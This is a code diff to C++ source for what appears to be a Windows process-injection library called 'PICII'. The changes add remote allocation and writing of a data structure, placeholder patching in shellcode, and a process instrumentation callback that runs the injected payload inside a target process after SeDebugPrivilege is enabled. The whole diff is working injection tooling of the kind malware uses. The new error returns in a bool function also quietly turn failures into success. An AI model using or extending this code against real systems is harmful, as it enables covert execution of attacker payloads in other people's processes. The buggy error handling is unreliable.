@@ -5,6 +5,7 @@
 
 LPVOID payloadBaseAddr;
 LPVOID wrapperBaseAddr;
+LPVOID structBaseAddr;
 
 #define _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION 40
 
@@ -45,11 +46,32 @@ int replacePlaceHolder(){
 
     for(int i = 0; i < bin_wrapper_bin_len - 10; i++){
         if(memcmp(&bin_wrapper_bin[i], pattern, 10) == 0){
-            memcpy(&bin_wrapper_bin[i + 2], &wrapperBaseAddr, 8);
+            memcpy(&bin_wrapper_bin[i + 2], &payloadBaseAddr, 8);
             return i;
         }
     }
 
+    return -1;
+}
+
+int allocateAndWriteStructure(HANDLE handle, void* structPointer, size_t size){
+    structBaseAddr = VirtualAllocEx(handle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if(!structBaseAddr) return 0;
+
+    bool writeStruct = WriteProcessMemory(handle, structBaseAddr, structPointer, size, 0);
+    if(!writeStruct) return 0;
+
+    return true;
+}
+
+int replaceStructPlaceHolderPayload(unsigned char* payload, unsigned int payloadSize, BYTE* pattern, unsigned int patternSize){
+    for(int i = 0; i < payloadSize - patternSize; i++){
+        if(memcmp(&payload[i], pattern, patternSize) == 0){
+            memcpy(&payload[i], &structBaseAddr, sizeof(void*));
+            return i;
+        }
+    }
+    
     return -1;
 }
 
@@ -66,24 +88,38 @@ bool setProcessCallback(HANDLE handle){
     return true;
 }
 
-bool PICII::inject(HANDLE handle, size_t size, unsigned char* payload, unsigned int lenght, bool debug){
-    if(!enableDebugPrivilege()) return 0;
+bool PICII::inject(HANDLE handle, size_t size, unsigned char* payload, unsigned int lenght, void* structPointer, size_t structSize, BYTE* pattern, unsigned int patternSize, bool debug){
+    // 1. Enable privilege
+    if(!enableDebugPrivilege()) return -2;
     if(debug) std::cout << "[PICII] enabled se debug privilege" << std::endl;
 
-    if(!allocateMemory(handle, size)) return 0;
+    // 2. Allocate memory for the wrapper and payload
+    if(!allocateMemory(handle, size)) return -3;
     if(debug) std::cout << "[PICII] wrapper memory allocated at " << std::hex << wrapperBaseAddr << std::endl;
     if(debug) std::cout << "[PICII] payload memory allocated at " << std::hex << payloadBaseAddr << std::endl;
 
+    // 3. Replace the placeholder of the wrapper, to call the payload correctly
     int pos = replacePlaceHolder();
-    if(pos == -1) return 0;
+    if(pos == -1) return -4;
     if(debug) std::cout << "[PICII] placeholder found at pos: " << pos << std::endl;
     if(debug) std::cout << "[PICII] placeholder replaced with: " << std::hex << payloadBaseAddr << std::endl;
+
+    // 4. Structures
+    if(!allocateAndWriteStructure(handle, structPointer, structSize)) return -5;
+    if(debug) std::cout << "[PICII] allocatted structure at: " << std::hex << structBaseAddr << std::endl;
+    if(debug) std::cout << "[PICII] structure written" << std::endl;
+
+    int posStruct = replaceStructPlaceHolderPayload(payload, lenght, pattern, patternSize);
+    if(posStruct == -1) return -6;
+    if(debug) std::cout << "[PICII] replaced placeholder structure of the payload at the pos " << std::dec << posStruct << std::endl;
     
-    if(!writeMemory(handle, payload, lenght)) return 0;
+    // 5. Write the payload in memory
+    if(!writeMemory(handle, payload, lenght)) return -7;
     if(debug) std::cout << "[PICII] memory written" << std::endl;
 
-    if(!setProcessCallback(handle)) return 0;
-    if(debug) std::cout << "[PICII] process instrumentation callback information set" << std::endl;\
+    // 6. Set instrumentation callback
+    if(!setProcessCallback(handle)) return -8;
+    if(debug) std::cout << "[PICII] process instrumentation callback information set" << std::endl;
 
     return true;
 }
